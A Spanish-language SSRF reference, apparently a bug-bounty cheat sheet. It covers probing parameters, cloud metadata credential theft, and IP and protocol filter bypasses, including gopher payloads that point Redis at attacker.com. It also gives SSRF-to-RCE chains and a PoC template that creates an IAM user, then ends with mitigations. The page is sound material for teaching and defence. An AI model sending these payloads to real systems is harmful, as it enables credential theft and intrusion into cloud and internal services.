---
title: "SSRF (Server-Side Request Forgery)"
description: "Forzar al servidor a hacer peticiones HTTP a destinos elegidos por el atacante."
category: "Web"
date: 2026-07-18
---
# SSRF (Server-Side Request Forgery)

Forzar al servidor a hacer peticiones HTTP a destinos elegidos por el atacante. El servidor tiene acceso a red interna que el atacante no tiene: servicios internos, endpoints cloud metadata, localhost, otros microservicios.

OWASP A10:2021. Los ataques SSRF aumentaron 452% entre 2023-2024.

## Tipos de SSRF

| Tipo | Descripción | Detección |
|------|-------------|-----------|
| **Classic (Reflected)** | El servidor devuelve la respuesta de la URL solicitada | Ver el contenido en la respuesta HTTP |
| **Blind** | No se ve la respuesta, pero el servidor hace la petición | OOB / Collaborator / time-based |
| **Semi-blind** | La respuesta no se ve directamente, pero causa efectos observables | Status code diff, timing, errores |

## Dónde buscar SSRF

### Parámetros comunes
```
url= uri= path= src= href= link= callback= redirect= webhook=
feed= proxy= image= file= document= host= domain= dest= target=
```

### Features peligrosas
- **Generadores de PDF/Screenshot** — convierten URL a PDF (WeasyPrint, wkhtmltopdf, Puppeteer)
- **Webhook validators** — el servidor fetchea la URL del webhook para verificarla
- **Image/profile picture upload via URL** — fetch remoto de imagen de avatar
- **XML/SVG parsing** — XXE a SSRF
- **Link unfurling/preview** — generación de previsualización de enlaces en chats
- **OAuth flows** — el servidor fetchea `.well-known/openid-configuration` del IdP
- **File import** — importar documentos desde URL
- **Video/audio processing** — streaming desde URL
- **DNS features** — check MX, SPF records
- **Headers** — `X-Forwarded-Host`, `X-Original-URL`

## Cómo confirmar SSRF

```
url=https://COLLABORATOR.burpcollaborator.net
url=http://canarytoken.yourserver.com/test
```

Si el DNS/HTTP request llega desde IP del servidor (no tu browser), es SSRF.

## Cloud Metadata Exploitation

### AWS — IMDSv1 (sigue siendo común)

Endpoint: `http://169.254.169.254/`

```http
GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

Listar roles IAM:
```http
GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
```

Obtener credenciales:
```http
GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/NOMBRE-DEL-ROLE HTTP/1.1
```

Respuesta:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI/...",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2026-07-11T..."
}
```

### AWS — IMDSv2 (token requerido)

IMDSv2 requiere PUT request para obtener token primero:

```http
PUT /?url=http://169.254.169.254/latest/api/token HTTP/1.1
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Luego usar el token:
```http
GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE HTTP/1.1
X-aws-ec2-metadata-token: TOKEN
```

**Bypass IMDSv2**: si el SSRF permite método PUT y headers personalizados (algunos PDF generators, gopher://, webhooks), IMDSv2 no protege.

### AWS — ECS Task Metadata (también interesante)

```
http://169.254.170.2/v2/credentials/
http://169.254.170.2/v2/metadata
```

### AWS — Lambda Runtime API
```
http://localhost:9001/2018-06-01/runtime/invocation/next
```

### GCP — Compute Metadata

Endpoint: `http://metadata.google.internal/computeMetadata/v1/`

Requiere header: `Metadata-Flavor: Google`

```bash
curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
```

```bash
curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'
```

Recursos de interés en GCP:
- `instance/service-accounts/default/token` — OAuth2 token
- `instance/service-accounts/default/identity?audience=...` — ID token
- `instance/attributes/kube-env` — kubelet creds en GKE
- `project/project-id`

**Bypass GCP**: el endpoint legacy `v1beta1` NO requiere header en instancias donde no se ha deshabilitado:
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

### Azure — Managed Identity

Endpoint: `http://169.254.169.254/metadata/identity/oauth2/token`

Requiere header: `Metadata: true`

```
GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Host: 169.254.169.254
Metadata: true
```

```
GET /metadata/instance?api-version=2021-02-01
Metadata: true
```

### Alibaba Cloud / Oracle Cloud

```bash
# Alibaba Cloud
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/

# Oracle Cloud
curl -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/
```

### Kubernetes endpoints reachables vía SSRF

```bash
curl http://kubernetes.default.svc/api/v1/namespaces/default/secrets
curl -k https://10.96.0.1/api/v1/namespaces/kube-system/secrets

# etcd
curl http://10.0.0.10:2379/v2/keys/

# kubelet
curl -k https://127.0.0.1:10250/pods
```

## Técnicas de bypass (filtros SSRF)

### Bypass de blocklists de IP/localhost

| Técnica | Ejemplo |
|---------|---------|
| IPv4 alternativo (decimal) | `http://2130706433/` → `127.0.0.1` |
| IPv4 alternativo (hex) | `http://0x7f000001/` |
| IPv4 alternativo (octal) | `http://0177.0.0.1/` |
| IPv6 loopback | `http://[::1]/` |
| IPv4-mapped IPv6 | `http://[::ffff:127.0.0.1]/` |
| Short IPv6 | `http://[0:0:0:0:0:ffff:127.0.0.1]/` |
| Domain con DNS a 127.0.0.1 | `http://localhost/` (o registrar dominio propio) |
| DNS rebinding | Dominio que alterna entre IP pública e IP interna |
| Redirect | URL externa que redirige 302 a `http://169.254.169.254/` |
| URL with @ | `http://expected-host.com@169.254.169.254/` |
| URL parse confusion | `http://evil.com#http://good.com/` o `http://evil.com?http://good.com/` |

### Bypass de protocolos

```bash
# gopher:// — permite enviar TCP raw (útil para Redis, SMTP, etc.)
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a

# dict:// — permite enviar comandos a servicios TCP
dict://169.254.169.254:80/latest/meta-data/iam/security-credentials/

# ldap:// — SSRF a LDAP
ldap://internal-ad.example.com:389/

# jar:// (Java) — protocolo ZIP dentro de JAR
jar:http://attacker.com/evil.jar!/payload
```

### DNS rebinding

Registrar un dominio que alterna entre dos IPs:
1. Primera resolución → IP pública válida (pasa el filtro)
2. Segunda resolución → `169.254.169.254` (para el SSRF)

Herramientas:
- `1u.ms` (rebind.it)
- `lock.cmpxchg8b.com` (rebinder)
- `rbndr.us`

## SSRF → RCE Chains

### 1. SSRF → Cloud Metadata → IAM creds → AWS console → RCE vía SSM
```
SSRF → IMDS creds → aws ssm send-command → RCE en instancia
```

### 2. SSRF → Redis (gopher://)

```bash
# Redis SLAVEOF + CRON RCE via gopher
gopher://redis.internal:6379/_SLAVEOF%20attacker.com%206379%0d%0a
```

### 3. SSRF → Elasticsearch
```
SSRF → http://es.internal:9200/_search?q=... (acceso a datos)
SSRF → http://es.internal:9200/_nodes (info de nodos + rutas)
```

### 4. SSRF → MinIO / S3-compatible internal
```
SSRF → http://minio.internal:9000/webrpc (crear bucket público)
```

### 5. SSRF → HashiCorp Vault
```
SSRF → http://vault.internal:8200/v1/secret/data/...
```

### 6. SSRF → Docker Engine API
```
SSRF → http://localhost:2375/containers/create (spawn container malicioso)
SSRF → http://localhost:2375/containers/json (listar containers)
```

### 7. SSRF → PDF Generator → RCE
- WeasyPrint: https://weasyprint.readthedocs.io

## Herramientas

- **Burp Suite** — Collaborator para blind SSRF, Repeater, Intruder
- **SSRFmap** — automatización de explotación SSRF
- **Gopherus** — generar payloads gopher:// para Redis, MySQL, SMTP, etc.
- **SSRFHunter** — framework 2025 con detección de GraphQL, WebSocket, AI endpoints
- **ffuf** — fuzzing de endpoints para encontrar SSRF
- **Interactsh** — OOB callback detection (alternativa open-source a Burp Collaborator)
- **ngrok/RequestBin** — para capturar requests
- **DNS rebinder tools** — `1u.ms`, `lock.cmpxchg8b.com`

## CVEs relevantes (2025-2026)

| CVE | Producto | Tipo | Impacto |
|-----|----------|------|---------|
| CVE-2025-61882 | Oracle EBS | SSRF via URL parameter | Internal network access |
| CVE-2025-53767 | Azure OpenAI | SSRF | Cloud metadata access |
| CVE-2025-54122 | Manager-io/Manager | SSRF unauthenticated | AWS metadata exfil |
| CVE-2025-51591 | Pandoc | SSRF via iframe | IMDS credential theft |
| CVE-2025-31133 | Kubernetes | SSRF via container escape | Container breakout |
| CVE-2026-40175 | Axios < 1.15.0 | SSRF via URL parsing | IMDSv2 bypass |
| CVE-2021-22214 | GitLab | SSRF via webhook | Internal network scan |
| CVE-2021-3129 | Laravel Ignition | SSRF → RCE | Remote code execution |

## Bug Bounty Reports Reales

- **Capital One (2019)** — $100M breach via SSRF en WAF → IMDS → S3 exfil (106M registros)
- **HackerOne analytics $25k** — SSRF via PDF report generation → AWS metadata
- **Shopify Exchange $25k** — SSRF via webhook validator
- **Reddit Matrix $6k** — SSRF via link preview
- **U.S. DoD** — SSRF via outdated Confluence → internal servers
- **LarkSuite** — SSRF bypass via doc import (Confluence ZIP + XXE)
- **Dropbox/HelloSign $4,913** — SSRF to metadata
- **Snapchat $4k** — SSRF to GCP metadata
- **Yahoo Mail $15k** — gopher:// SSRF → Redis → RCE

## PoC Template for Report

```
1. SSRF trigger: POST /api/render con body {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
2. Response contiene role name: "app-prod-role"
3. Segundo request a /app-prod-role devuelve AccessKeyId, SecretAccessKey, Token
4. aws sts get-caller-identity confirma: arn:aws:iam::123456789:assumed-role/app-prod-role/i-abc123
5. enumerate-iam output muestra iam:CreateUser permission
6. Created test user "bb-test" y deleted inmediatamente para probar admin access
```

## Detección y Prevención

### Defensa en código
```python
# En vez de requests.get(url, timeout=5)
# Siempre validar:
# 1. Allowlist de dominios permitidos
# 2. Resolver DNS y verificar IP no es privada
# 3. Bloquear 169.254.169.254, 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
# 4. NO confiar en URL parsing (los parsers son inconsistentes)
```

### AWS mitigations
- **IMDSv2 obligatorio** (require token)
- Firewall: bloquear egress a `169.254.169.254` desde apps no autorizadas
- Menor privilegio IAM

### GCP mitigations
- Requerir `Metadata-Flavor: Google`
- Deshabilitar v1beta1
- Workload Identity en GKE

### Azure mitigations
- Requerir `Metadata: true`
- Managed Identity con resource scope limitado

## Denylist defeat (NO USAR blocklists — usar allowlists)

Los blocklists de IP son trivialmente bypassables:
- `127.1` → 127.0.0.1
- `0` → 0.0.0.0
- `0x7f.0.0.1` → 127.0.0.1
- `2130706433` → 127.0.0.1
- `0177.0.0.1` → 127.0.0.1
- DNS rebinding
- Redirect 302

## Relacionado

- **Metodologia Bug Bounty**
- **XXE** — XXE puede escalar a SSRF (vía entidades externas)
- **Host Header Injection** — routing-based SSRF via Host
- **HTTP Request Smuggling** — desync + SSRF
- **Race Conditions** — time-based SSRF detection
- **Subdomain Takeover y Recon Web** — metadata discovery en subdominios
- **Web HTB Academy** — módulos SSRF
- **Claude-BugHunter** (skills: `hunt-ssrf`, `cloud-iam-deep`)
